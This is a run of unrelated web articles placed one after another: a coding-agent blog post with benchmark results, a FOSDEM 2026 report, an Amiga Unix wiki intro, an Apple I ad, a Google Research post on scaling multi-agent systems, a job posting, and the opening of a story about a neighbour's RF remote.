    &lt;p&gt;With a simple prompt, I can select what specific thing I want to review and what model to use. I could even set thinking levels if I wanted to. I can also save out the full review session to a file and hop into that in another pi session if I wanted. Or I can say this is an ephemeral session and it shouldn't be saved to disk. All of that gets translated into a prompt that the main agent reads and based on which it executes itself again via bash. And while I don't get full observability into the inner workings of the sub-agent, I get full observability on its output. Something other harnesses don't really provide, which makes no sense to me.&lt;/p&gt;
    &lt;p&gt;Of course, this is a bit of a simulated use case. In reality, I would just spawn a new pi session and ask it to review the pull request, possibly pull it into a branch locally. After I see its initial review, I give my own review and then we work on it together until it's good. That's the workflow I use to not merge garbage code.&lt;/p&gt;
    &lt;p&gt;Spawning multiple sub-agents to implement various features in parallel is an anti-pattern in my book and doesn't work, unless you don't care if your codebase devolves into a pile of garbage.&lt;/p&gt;
    &lt;head rend="h2"&gt;Benchmarks&lt;/head&gt;
    &lt;p&gt;I make a lot of grandiose claims, but do I have numerical proof that all the contrarian things I say above actually work? I have my lived experience, but that's hard to transport in a blog post and you'd just have to believe me. So I created a Terminal-Bench 2.0 test run for pi with Claude Opus 4.5 and let it compete against Codex, Cursor, Windsurf, and other coding harnesses with their respective native models. Obviously, we all know benchmarks aren't representative of real-world performance, but it's the best I can provide you as a sort of proof that not everything I say is complete bullshit.&lt;/p&gt;
    &lt;p&gt;I performed a complete run with five trials per task, which makes the results eligible for submission to the leaderboard. I also started a second run that only runs during CET because I found that error rates (and consequently benchmark results) get worse once PST goes online. Here are the results for the first run:&lt;/p&gt;
    &lt;p&gt;And here's pi's placement on the current leaderboard as of December 2nd, 2025:&lt;/p&gt;
    &lt;p&gt;And here's the results.json file I've submitted to the Terminal-Bench folks for inclusion in the leaderboard. The bench runner for pi can be found in this repository if you want to reproduce the results. I suggest you use your Claude plan instead of pay-as-you-go.&lt;/p&gt;
    &lt;p&gt;Finally, here's a little glimpse into the CET-only run:&lt;/p&gt;
    &lt;p&gt;This is going to take another day or so to complete. I will update this blog post once that is done.&lt;/p&gt;
    &lt;p&gt;Also note the ranking of Terminus 2 on the leaderboard. Terminus 2 is the Terminal-Bench team's own minimal agent that just gives the model a tmux session. The model sends commands as text to tmux and parses the terminal output itself. No fancy tools, no file operations, just raw terminal interaction. And it's holding its own against agents with far more sophisticated tooling and works with a diverse set of models. More evidence that a minimal approach can do just as well.&lt;/p&gt;
    &lt;head rend="h2"&gt;In summary&lt;/head&gt;
    &lt;p&gt;Benchmark results are hilarious, but the real proof is in the pudding. And my pudding is my day-to-day work, where pi has been performing admirably. Twitter is full of context engineering posts and blogs, but I feel like none of the harnesses we currently have actually let you do context engineering. pi is my attempt to build myself a tool where I'm in control as much as possible.&lt;/p&gt;
    &lt;p&gt;I'm pretty happy with where pi is. There are a few more features I'd like to add, like compaction or tool result streaming, but I don't think there's much more I'll personally need. Missing compaction hasn't been a problem for me personally. For some reason, I'm able to cram hundreds of exchanges between me and the agent into a single session, which I couldn't do with Claude Code without compaction.&lt;/p&gt;
    &lt;p&gt;That said, I welcome contributions. But as with all my open source projects, I tend to be dictatorial. A lesson I've learned the hard way over the years with my bigger projects. If I close an issue or PR you've sent in, I hope there are no hard feelings. I will also do my best to give you reasons why. I just want to keep this focused and maintainable. If pi doesn't fit your needs, I implore you to fork it. I truly mean it. And if you create something that even better fits my needs, I'll happily join your efforts.&lt;/p&gt;
    &lt;p&gt;I think some of the learnings above transfer to other harnesses as well. Let me know how that goes for you.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;&lt;head rend="h1"&gt;FOSDEM 2026 – Open Source, Digital Sovereignty, and Europes Future&lt;/head&gt;():&lt;p&gt;FOSDEM, the Free and Open Source Developers’ European Meeting, is an annual pilgrimage for open source enthusiasts from all over the world. What started as a small gathering in 2000, originally named the Open Source Developers of Europe Meeting (OSDEM), has grown into one of the most significant conferences dedicated to free and open source software.&lt;/p&gt;&lt;p&gt;In 2026, FOSDEM felt more purposeful than ever. The conference clearly reflected a growing awareness around digital sovereignty and Europe’s technological future.&lt;/p&gt;&lt;p&gt;Self hosted solutions, open infrastructure, and community driven software were no longer niche topics. They were central to many discussions and presentations. The focus has visibly shifted away from convenience first and centralized platforms and toward systems that put control, transparency, and resilience back into the hands of users and communities. This shift was ily supported by established communities such as the FreeBSD project, which continues to demonstrate how long term, openly governed systems can serve as reliable foundations for sovereign infrastructure. At the same time, smaller but equally important projects showed how grassroots innovation drives real change. Talks like Hyacinthe’s FlipFlap presentation on the DN42 network highlighted decentralized and community operated networking in practice, while Emile’s talk on SmolBSD demonstrated how minimal, purpose built BSD systems can bring clarity, auditability, and long term maintainability back to operating system design. Projects such as BoxyBSD, crafted by gyptazy, showcased how lowering the barrier to learning BSD based systems empowers the next generation of open source contributors. By providing free invite codes during FOSDEM, BoxyBSD made hands on experimentation immediately accessible and reinforced the conference’s spirit of openness and community support.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 made one thing unmistakably clear. Open source is no longer just about software freedom. It is increasingly about independence, sustainability, and Europe’s ability to shape its own digital future.&lt;/p&gt;&lt;head rend="h2"&gt;Arrival at FOSDEM 2026&lt;/head&gt;&lt;p&gt;Like every year, I decided to travel to FOSDEM by car. It’s actually the most relaxed way for me to get there as I can simply drive at any time in the morning, but it comes with one clear disadvantage: you have to arrive very early to secure a parking spot directly on campus. That means starting the journey long before the city fully wakes up. Overall, the travel time is more or less the same as taking the train, so that part doesn’t really matter. What does matter is the flexibility and being able to move around freely and head back home whenever I want. Since I usually only attend the first day of FOSDEM, that flexibility makes the early start worth it.&lt;/p&gt;&lt;p&gt;This year, the effort paid off once again. I ended up being the first car in line at the gate leading to the parking area. Better safe than sorry. Anyone who has attended FOSDEM knows that parking nearby is a small victory that can shape the rest of the day.&lt;/p&gt;&lt;p&gt;After parking, there was time to slow down a bit. Before the talks began, the campus gradually filled with familiar faces. FOSDEM has a unique rhythm in the early morning hours, when everything is still calm and conversations happen without rushing from room to room.&lt;/p&gt;&lt;p&gt;I met up with a few friends, and we took the opportunity to catch up and exchange a few thoughts before the day properly started. With coffees and croissants in hand, we waited for the opening talk. It was a simple moment, but one that perfectly captured the atmosphere of FOSDEM: a mix of anticipation, community, and shared curiosity about what the weekend would bring.&lt;/p&gt;&lt;head rend="h2"&gt;My Talk-Schedule at FOSDEM 2026&lt;/head&gt;&lt;p&gt;My personal schedule at FOSDEM followed a clear thread: understanding infrastructure from the lowest layers up to real-world, community operated systems. Rather than chasing trends, I focused on talks that explored control, reliability, and long term sustainability.&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Rust-VMM&lt;/item&gt;&lt;item&gt;Garage S3 Best Practices&lt;/item&gt;&lt;item&gt;Mobility of Virtual Machines in Kubernetes Clusters&lt;/item&gt;&lt;item&gt;SmolBSD&lt;/item&gt;&lt;item&gt;FlipFlap Network in DN42&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The Rust-VMM talk set the tone by diving into modern virtualization foundations built with memory safety in mind. It highlighted how Rust enables a new generation of virtual machine monitors that reduce entire classes of bugs while still meeting strict performance requirements. For anyone working close to hardware or hypervisors, it was a i argument for rethinking traditional systems programming choices.&lt;/p&gt;&lt;p&gt;With Garage S3 Best Practices, the focus shifted from design to day-to-day operations. Object storage is often treated as a commodity, yet the talk made it clear how many subtle challenges exist around consistency, failure handling, and scaling. Real operational lessons and practical advice emphasized that running storage reliably is just as important as building it.&lt;/p&gt;&lt;p&gt;The talk on Mobility of Virtual Machines in Kubernetes Clusters explored the increasingly blurred line between classical virtualization and container orchestration. It showed how virtual machines can move and adapt within Kubernetes environments, combining the i isolation of VMs with the flexibility of cloud native tooling. This hybrid approach challenges the idea that platforms must choose one model exclusively.&lt;/p&gt;&lt;p&gt;SmolBSD brought a refreshing focus on minimalism. Instead of adding more layers, the project embraces small, understandable systems that are easier to audit and maintain over time. The talk reinforced the idea that simplicity is not a limitation but a strategic choice, especially for long lived infrastructure.&lt;/p&gt;&lt;p&gt;Finally, FlipFlap Network in DN42 connected many of the earlier themes through a community perspective. DN42 demonstrates how decentralized, self operated networking can work in practice. The talk showcased automation, experimentation, and cooperation in a real network built by its users, highlighting the educational and innovative power of grassroots infrastructure.&lt;/p&gt;&lt;p&gt;Together, these talks formed a coherent journey through modern open infrastructure: from safe low level building blocks to resilient storage, hybrid orchestration models, minimal operating systems, and community driven networks.&lt;/p&gt;&lt;head rend="h2"&gt;Best of...&lt;/head&gt;&lt;p&gt;One of my personal highlights of FOSDEM 2026 was a wonderfully simple yet brilliant idea by the Mozilla Foundation: giving away free cookies. It turned out to be more than just snacks. It was a fun little game, a great conversation starter, and the selection of cookies was genuinely excellent. You might have come for open source, but you probably left liking cookies even more than before.&lt;/p&gt;&lt;p&gt;Another standout moment was the talk The Challenges of FLOSS Office Suites by Michael Meeks, where he dove into the technical details behind Collabora Online. It was an absolute pleasure to listen to. What made the talk special was not only the depth of technical insight, but also the way it was presented. Complex topics were explained clearly, with context and humor, making it accessible without oversimplifying.&lt;/p&gt;&lt;p&gt;I was genuinely amazed by how the challenges of building and maintaining a full-featured, open source office suite were laid out so honestly. The talk went far beyond architecture diagrams and performance considerations and gave real insight into the long-term effort required to keep such critical software alive and competitive.&lt;/p&gt;&lt;p&gt;Beyond the talks, I also took the opportunity to have some great conversations at the booths. I chatted with fixoulab at the Proxmox booth and with the XCP-ng team at Vates, where I got an early look at the newly released Orchestra features. It was especially interesting since I had not yet found the time to dive into them in detail.&lt;/p&gt;&lt;p&gt;On a more personal note, I was truly grateful to meet many of my friends from different countries again. Being able to jump into great talks together, exchange impressions on the spot, and continue discussions afterwards is something that makes FOSDEM special in a way no recording or live stream ever could.&lt;/p&gt;&lt;head rend="h2"&gt;What the heck is going on at the FOSDEM 2026?&lt;/head&gt;&lt;p&gt;FOSDEM has always been crowded. Anyone who has attended more than once knows the familiar experience of packed hallways, full lecture rooms, and sprinting between buildings in the hope of catching the last five minutes of a talk. As the biggest open source conference in the world, this has long been part of its identity. But in 2026, it felt like something had shifted.&lt;/p&gt;&lt;p&gt;There is no doubt that the growing interest in free and open source software is a good thing. More people take open source seriously, more organizations depend on it, and more contributors want to get involved. That energy was clearly visible everywhere. At the same time, it felt like FOSDEM was reaching — or perhaps exceeding — its natural limits. Rooms filled faster than ever, informal discussions became harder to have, and the sheer density of people sometimes worked against the very openness the conference is known for.&lt;/p&gt;&lt;p&gt;A major driver behind this growth is the current political and economic climate. Topics like digital sovereignty, technological independence, and reducing reliance on a small number of dominant market players were more present than ever. This was not subtle. It was visible across the schedule, in hallway conversations, and especially during the Friday pre-conferences, where these themes were actively pursued and debated.&lt;/p&gt;&lt;p&gt;On one hand, this focus is both necessary and overdue. Open source has always been political in the sense that it is about control, transparency, and autonomy, even when it pretended not to be. Seeing these discussions move to the center stage at FOSDEM is encouraging. It shows that the community understands the stakes and is willing to engage with the broader implications of the technology it builds.&lt;/p&gt;&lt;p&gt;On the other hand, the intensity of this shift raises uncomfortable questions. When everything becomes urgent and strategic, the space for experimentation, learning, and smaller niche projects risks being squeezed out. Not every open source project exists to solve geopolitical problems, and not every contributor arrives with a policy agenda. FOSDEM has always thrived on its diversity of motivations, and maintaining that balance will be increasingly challenging.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 felt like a conference at a crossroads. Its success is undeniable, but so are the growing pains that come with it. The challenge for the coming years will be finding ways to scale without losing what made the event special in the first place: accessibility, spontaneity, and the feeling that there is room for everyone and not just for the loudest or most timely topics. And while I already criticized this last year, this becomes even more important this year.&lt;/p&gt;&lt;p&gt;The conversations happening now are important, and it is good that they are happening at FOSDEM. But if the conference is to remain sustainable, both logistically and culturally, it will need to evolve just as thoughtfully as the open source ecosystem it represents.&lt;/p&gt;&lt;head rend="h2"&gt;Final Thoughts&lt;/head&gt;&lt;p&gt;It is genuinely great to see that FOSDEM remains free and open to everyone, even as the topics it covers become more complex and more relevant. The growing focus on moving away from big tech and reclaiming ownership of our data shows that the community is paying attention to what truly matters. These discussions are necessary, and it is encouraging to see them reflected so clearly in the talks and hallway conversations.&lt;/p&gt;&lt;p&gt;The quality of the talks was high, and the people were, as always, amazing. FOSDEM continues to be a place where curiosity, expertise, and openness meet. At the same time, the question of scale can no longer be ignored. Camping in front of a single room just to make sure you can attend a talk is not a sustainable solution. In many cases, it may even discourage the people who are genuinely interested but cannot afford to wait for hours or navigate overcrowded spaces.&lt;/p&gt;&lt;p&gt;For exactly this reason, I seriously considered staying home this year and watching the talks via live streams or recordings. From a purely technical perspective, that would have worked just fine. The content would still be there, accessible and well produced.&lt;/p&gt;&lt;p&gt;But in the end, FOSDEM is not just about talks. It is about meeting people, reconnecting with friends, and having spontaneous conversations that no video stream can fully replace. Seeing all of you again, sharing thoughts over coffee, and exchanging ideas in person ultimately mattered more than comfort or convenience.&lt;/p&gt;&lt;p&gt;FOSDEM 2026 once again proved why this conference is special. The challenge now is to ensure that it can continue to grow without losing the openness and accessibility that define it. That balance will shape what FOSDEM becomes in the years to come.&lt;/p&gt;&lt;/main&gt;

    &lt;p&gt;Welcome to the Amiga Unix wiki!&lt;/p&gt;
    &lt;p&gt;Amiga UNIX (also known as “Amix”) was Commodore's port of AT&amp;amp;T System V Release 4 Unix to the Amiga in 1990. Like many early Unix variants, Amiga Unix never became wildly popular, but it is an interesting sidestep in the history of the Amiga.&lt;/p&gt;
    &lt;p&gt;The two “official” machines that could run Amix were the Amiga 2500UX and 3000UX models, however it can run on any Amiga that meets its hardware requirements. The awesome Amiga emulator WinUAE has been able to run it since 2013 (version 2.7.0 onwards).&lt;/p&gt;
    &lt;p&gt;This site is dedicated on preserving Amix's history and sharing information and instructions on what Amix is, how to install it (either on real hardware or in emulation) and what can you do with it. Mainly, it tries to cater to people who wish to run AMIX for whatever reason on their hardware. By documenting experiences with it, it is hoped that subsequent SVR4 junkies will find the way more smooth than it might have been without any guidance at all. For even a relatively experienced modern Unix or GNU/Linux administrator, System V UNIX is sufficiently different to present difficulty in installation and administration. Not so much in moving around between directories, and using common utilities that persist to this day - although many of those are hoary and somewhat forgetful in their retirement - but of doing more in depth tasks and understanding the differences.&lt;/p&gt;

      &lt;item&gt;Old, and riddled with Spam, but there once was a thriving Newsgroup dedicated to Amiga Unix. Seeing the Internet “never forgets”, you can find the old discussions at Google Groups: https://groups.google.com/forum/#!forum/comp.unix.amiga&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Where to get help with Amix?&lt;/p&gt;
    &lt;p&gt;Currently the most active Amix-related forum seems to be support.Amix @ English Amiga Board. Ask there if you need any help!&lt;/p&gt;
    &lt;p&gt;Wanted: content for this site! Do you have a piece of third-party software for Amix? Copy of an exotic hardware driver? Would you like to help write guides? Have copy of files from litamiga.epfl.ch or amiga.physik.unizh.ch? Please let us know!&lt;/p&gt;
    &lt;p&gt;Why would you like to try Amix? The short answer is, you don't want it. Stay with me for just a minute here.&lt;/p&gt;
    &lt;p&gt;Amiga UNIX is really, really real UNIX. AT&amp;amp;T System V Release 4, ported by a team at Commodore that quit the day that 1.0 was released - at least, as legend has it. All the releases have their share of issues, and none of them have been updated in well over a decade. It runs on old hardware that was expensive when new and hard enough to find now that “RARE!” tags on eBay aren't hyperbole for once. You can cheat and get it installed without the tape drive, at least, but it's not for the faint of heart and has its own caveats such as a completely broken package system.&lt;/p&gt;
    &lt;p&gt;Think for a minute about your goals before embarking on this journey. If you're a die-hard Amiga user - and we all know they are still out there - interested in trying this UNIX thing, because you've heard about Mac OS X and that's based on UNIX, but before you swap out Kickstart for init you'd like to kick the tires on Amiga UNIX…&lt;/p&gt;
    &lt;p&gt;Don't.&lt;/p&gt;
    &lt;p&gt;Ten minutes with Amiga UNIX will have some Amiga users reaching for their 3.1 floppies. Actually, two minutes with the installer might have the same effect. That's just not fair to UNIX, whether it's GNU/Linux, Solaris, FreeBSD, or whatever. The environment has come a long way in the years and years since Amiga UNIX was shiny and new, rather than bitter and tarnished. Your average Ubuntu user will have set fire to their house trying to expunge any evidence of the unforgiving AMIX installation. Did I mention it hasn't been updated in a decade? Put your Amiga UNIX machine on the net with no firewall and you may see it rooted faster than a Win98SE box running IE5.&lt;/p&gt;
    &lt;p&gt;Finally, and this is a biggie, there is no future for AMIX. Its kernel, libc, and much of its software is closed source, so when Commodore folded its story was over. It was put to pasture even as free UNIX environments began to be truly plausible contenders for commercial UNIX, and largely forgotten.&lt;/p&gt;
    &lt;p&gt;So this is quite the happy page, isn't it? Why would you want to install AMIX?&lt;/p&gt;
    &lt;p&gt;There's really only one reason. Well, two, if you count being an idiot like us. That reason is simple curiosity. If you'd like to put yourself in the shoes of an aspiring systems programmer in the early nineties, go for it. If you find the legacy of the ever growing open source operating system revolution fascinating, AMIX could prove instructive. If you're trying to impress bearded UNIX gurus with arcane knowledge from the times when men were men, and 16MB was a ton of RAM, the dwindling lore of System V might be the key. These days, Amiga UNIX is all about history and learning.&lt;/p&gt;
    &lt;p&gt;So if you have the requisite hardware and you have girded yourself for what is in store for you should you venture into the m68k-cbm-sysv4 dungeon, you might enjoy this site and the dusty treasures it contains. But seriously, if you just want to try UNIX or GNU/Linux out, the most expedient way to do it is on x86 or just something better supported on Amiga hardware. There are lots of choices for you.&lt;/p&gt;
    &lt;p&gt;Good luck, and enjoy!&lt;/p&gt;

        &lt;p&gt; The Apple Computer. A truly complete microcomputer system on a single PC board. Based on the MOS Technology 6502 micro- processor, the Apple also has a built-in video terminal and sockets for 8K bytes of onboard RAM memory. With the addition of a keyboard and video monitor, you'll have an extremely powerful computer system that can be used for anything from developing programs to playing games or running BASIC.&lt;lb/&gt; Combining the computer, video terminal and dynamic memory on a single board has resulted in a large reduction in chip count, which means more reliability and lowered cost. Since the Apple comes fully assembled, tested &amp;amp; burned-in and has a complete power supply on-board, initial set-up is essentially "hassle-free" and you can be running within minutes. At $666.66 (including 4K bytes RAM!) it opens many new possibilities for users and systems manufacturers.&lt;/p&gt;
        &lt;p&gt;You Don't Need an Expensive Teletype.&lt;lb/&gt; Using the built-in video terminal and keyboard interface, you avoid all the expense, noise and mantenance associated with a teletype. And the Apple video terminal is six times faster than a teletype, which means more throughput and less waiting. The Apple connects directly to a video monitor (or home TV with an in- expensive RF modulator) and dis- plays 960 easy to read characters in 24 rows of 40 characters per line with automatic scrolling. The video display section contains its own 1K bytes of memory, so all the RAM memory is available for user programs. And the &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;Keyboard Interface lets you use almost any ASCII-encoded keyboard.&lt;lb/&gt; The Apple Computer makes it possible for many people with limited budgets to step up to a video terminal as an I/O device for their computer.&lt;/p&gt;
        &lt;p&gt;No More Switches,&lt;lb/&gt; No MoreLights&lt;lb/&gt; Compared to switches and LED's, a video terminal can dis- play vast amounts of information simultaneously. The Apple video terminal can display the contents of 192 memory locations at once on the screen. And the fimrware in PROMS enables you to enter,display and debug programs (all in hex) from the keyboard, ren- dering a front panel unnecessary. The firmware also allows your programs to print characters on the display, and since you'll be looking at letters and numbers instead of just LED's, the door is open to all kinds of alphanumeric software (i.e., Games and BASIC).&lt;/p&gt;
        &lt;p&gt;8K Bytes RAM in 16 Chips!&lt;lb/&gt; The Apple Computer uses the new 16-pin 4K dynamic memory chips. They are faster and take 1/4 the space and power of even the low power 2102's (the memory chip that everyone else uses). That means 8K bytes in sixteen chips. It also means no more 28 amp power supplies. The system is fully expandable to 65K via an edge connector which carries both the address and data busses, power supplies and all timing signals. All dy- namic memory refreshing for both on and off-board memory is done automatically. Also, the Apple Computer can be upgraded to use the 16K chips when they become availa- &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;ble. That's 32K bytes on-board RAM in 16 IC's --the equivalent of 256 2102's!&lt;/p&gt;
        &lt;p&gt;A little Cassette Board that Works!&lt;lb/&gt; Unlike many other cassette boards on the marketplace,ours works every timeIt plugs directly into the upright connector on the mainboard and stands only 2" tall.And since it is very fast (1500 bits per second), you can read or write 4 K bytes in about 20 seconds.All timing is done in software, witch results in crystal-controlled accuracy and uniformity from unit to unit.&lt;lb/&gt; unlike some other cassette interfaces witch requires an expensive tape recorder, the Apple Cassette Interface works reliably with almost any audio-grade cassette recorder.&lt;/p&gt;
        &lt;p&gt;Softwares&lt;lb/&gt; A tape of APPLE BASIC is inclued free with the Cassette Interface.Apple Basic features immediate error message and fast execution, and let's you program in a highter level language immediately and without added cost.Also avialable now are a dis-assembler and many games, with many software packages,(including a macro assembler) in the works.And since our philosophy is to provide software for our machines free or at minimal cost, you won't be continually paying for access to this growing software library.&lt;lb/&gt; The Apple Computer is in stock al almost all major computer stores.(if your local computer store doesn't carry our products, encourage them or write us direct).Dealer inquiries invited. &lt;/p&gt;
      &lt;/cell&gt;

    &lt;head rend="h1"&gt;Towards a science of scaling agent systems: When and why agent systems work&lt;/head&gt;
    &lt;p&gt;January 28, 2026&lt;/p&gt;
    &lt;p&gt;Yubin Kim, Research Intern, and Xin Liu, Senior Research Scientist, Google Research&lt;/p&gt;
    &lt;p&gt;Through a controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for AI agent systems, revealing that multi-agent coordination dramatically improves performance on parallelizable tasks but degrades it on sequential ones; we also introduce a predictive model that identifies the optimal architecture for 87% of unseen tasks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick links&lt;/head&gt;
    &lt;p&gt;AI agents — systems capable of reasoning, planning, and acting — are becoming a common paradigm for real-world AI applications. From coding assistants to personal health coaches, the industry is shifting from single-shot question answering to sustained, multi-step interactions. While researchers have long utilized established metrics to optimize the accuracy of traditional machine learning models, agents introduce a new layer of complexity. Unlike isolated predictions, agents must navigate sustained, multi-step interactions where a single error can cascade throughout a workflow. This shift compels us to look beyond standard accuracy and ask: How do we actually design these systems for optimal performance?&lt;/p&gt;
    &lt;p&gt;Practitioners often rely on heuristics, such as the assumption that "more agents are better", believing that adding specialized agents will consistently improve results. For example, "More Agents Is All You Need" reported that LLM performance scales with agent count, while collaborative scaling research found that multi-agent collaboration "...often surpasses each individual through collective reasoning."&lt;/p&gt;
    &lt;p&gt;In our new paper, “Towards a Science of Scaling Agent Systems”, we challenge this assumption. Through a large-scale controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for agent systems, revealing that the "more agents" approach often hits a ceiling, and can even degrade performance if not aligned with the specific properties of the task.&lt;/p&gt;
    &lt;head rend="h2"&gt;Defining "agentic" evaluation&lt;/head&gt;
    &lt;p&gt;To understand how agents scale, we first defined what makes a task "agentic". Traditional static benchmarks measure a model's knowledge, but they don't capture the complexities of deployment. We argue that agentic tasks require three specific properties:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Sustained multi-step interactions with an external environment.&lt;/item&gt;
      &lt;item&gt;Iterative information gathering under partial observability.&lt;/item&gt;
      &lt;item&gt;Adaptive strategy refinement based on environmental feedback.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We evaluated five canonical architectures: one single-agent system (SAS) and four multi-agent variants (independent, centralized, decentralized, and hybrid) across four diverse benchmarks, including Finance-Agent (financial reasoning), BrowseComp-Plus (web navigation), PlanCraft (planning), and Workbench (tool use). The agent architectures are defined as follow:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Single-Agent (SAS): A solitary agent executing all reasoning and acting steps sequentially with a unified memory stream.&lt;/item&gt;
      &lt;item&gt;Independent: Multiple agents working in parallel on sub-tasks without communicating, aggregating results only at the end.&lt;/item&gt;
      &lt;item&gt;Centralized: A "hub-and-spoke" model where a central orchestrator delegates tasks to workers and synthesizes their outputs.&lt;/item&gt;
      &lt;item&gt;Decentralized: A peer-to-peer mesh where agents communicate directly with one another to share information and reach consensus.&lt;/item&gt;
      &lt;item&gt;Hybrid: A combination of hierarchical oversight and peer-to-peer coordination to balance central control with flexible execution.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Results: The myth of "more agents"&lt;/head&gt;
    &lt;p&gt;To quantify the impact of model capabilities on agent performance, we evaluated our architectures across three leading model families: OpenAI GPT, Google Gemini, and Anthropic Claude. The results reveal a complex relationship between model capabilities and coordination strategy. As shown in the figure below, while performance generally trends upward with more capable models, multi-agent systems are not a universal solution — they can either significantly boost or unexpectedly degrade performance depending on the specific configuration.&lt;/p&gt;
    &lt;p&gt;The results below compare the performance of the five architectures across different domains, such as web browsing and financial analysis. The box plots represent the accuracy distribution for each approach, while the percentages indicate the relative improvement (or decline) of multi-agent teams compared to the single-agent baseline. This data highlights that while adding agents can drive massive gains in parallelizable tasks, it can often lead to diminishing returns — or even performance drops — in more sequential workflows.&lt;/p&gt;
    &lt;head rend="h3"&gt;The alignment principle&lt;/head&gt;
    &lt;p&gt;On parallelizable tasks like financial reasoning (e.g., distinct agents can simultaneously analyze revenue trends, cost structures, and market comparisons), centralized coordination improved performance by 80.9% over a single agent. The ability to decompose complex problems into sub-tasks allowed agents to work more effectively.&lt;/p&gt;
    &lt;head rend="h3"&gt;The sequential penalty&lt;/head&gt;
    &lt;p&gt;Conversely, on tasks requiring strict sequential reasoning (like planning in PlanCraft), every multi-agent variant we tested degraded performance by 39-70%. In these scenarios, the overhead of communication fragmented the reasoning process, leaving insufficient "cognitive budget" for the actual task.&lt;/p&gt;
    &lt;head rend="h3"&gt;The tool-use bottleneck&lt;/head&gt;
    &lt;p&gt;We identified a "tool-coordination trade-off". As tasks require more tools (e.g., a coding agent with access to 16+ tools), the "tax" of coordinating multiple agents increases disproportionately.&lt;/p&gt;
    &lt;head rend="h2"&gt;Architecture as a safety feature&lt;/head&gt;
    &lt;p&gt;Perhaps most important for real-world deployment, we found a relationship between architecture and reliability. We measured error amplification, the rate at which a mistake by one agent propagates to the final result.&lt;/p&gt;
    &lt;p&gt;We found that independent multi-agent systems (agents working in parallel without talking) amplified errors by 17.2x. Without a mechanism to check each other's work, errors cascaded unchecked. Centralized systems (with an orchestrator) contained this amplification to just 4.4x. The orchestrator effectively acts as a "validation bottleneck", catching errors before they propagate.&lt;/p&gt;
    &lt;head rend="h2"&gt;A predictive model for agent design&lt;/head&gt;
    &lt;p&gt;Moving beyond retrospection, we developed a predictive model (R^2 = 0.513) that uses measurable task properties like tool count and decomposability to predict which architecture will perform best. This model correctly identifies the optimal coordination strategy for 87% of unseen task configurations.&lt;/p&gt;
    &lt;p&gt;This suggests we are moving toward a new science of agent scaling. Instead of guessing whether to use a swarm of agents or a single powerful model, developers can now look at the properties of their task, specifically its sequential dependencies and tool density, to make principled engineering decisions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;As foundational models like Gemini continue to advance, our research suggests that smarter models don't replace the need for multi-agent systems, they accelerate it, but only when the architecture is right. By moving from heuristics to quantitative principles, we can build the next generation of AI agents that are not just more numerous, but smarter, safer, and more efficient.&lt;/p&gt;

    &lt;p&gt;Eliminate compulsive phone usage&lt;/p&gt;
    &lt;p&gt;About Clearspace&lt;/p&gt;
    &lt;p&gt;Clearspace is building the intentionality layer of the internet. Our mission is to build technology as effective at protecting human attention as social media is at exploiting it (infinite scrolling, short-form feeds, manipulative notifications, etc). Our category defining mobile app has been featured on Huberman Lab, New York Times Wirecutter, NPR Marketplace, Forbes, TBPN.&lt;/p&gt;
    &lt;p&gt;People that want a better relationship with their devices have nowhere to turn except for willpower. We are building an agent that achieves this on all devices by processing and filtering network traffic based on natural language rules.&lt;/p&gt;
    &lt;p&gt;About The Role&lt;/p&gt;
    &lt;p&gt;We are looking for an ML-focused engineer that will be responsible for training and improving a model for classifying network traffic. You are great for this role if you are not only excited about the latest in AI and ML but are also a problem-solver in the data domain. You don’t just think about the model but “how can we get more data volume”; “how can we featurize the data intelligently”; “what are our data needs based on our task and desired model size”, and like building backwards from inference requirements.&lt;/p&gt;
    &lt;p&gt;Responsibilities&lt;/p&gt;
    &lt;p&gt;Qualifications&lt;/p&gt;
    &lt;p&gt;Nice to Have&lt;/p&gt;
    &lt;p&gt;At Clearspace we help people reduce compulsive phone usage.&lt;/p&gt;
    &lt;p&gt;We exist to protect people's attention from the exploits of modern technology platforms and make space for the things that matter to them most.&lt;/p&gt;
    &lt;p&gt;We believe the technology to protect someones attention should be just as sophisticated and effective as the tech that is exploiting it and are building a world-class engineering team to arm the world with a comprehensive attention protection stack.&lt;/p&gt;

  &lt;main&gt;
    &lt;p&gt;When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.&lt;/p&gt;
    &lt;p&gt;This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.&lt;/p&gt;
    &lt;p&gt;After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.&lt;/p&gt;
    &lt;p&gt;After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.&lt;/p&gt;
    &lt;p&gt;One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.&lt;/p&gt;
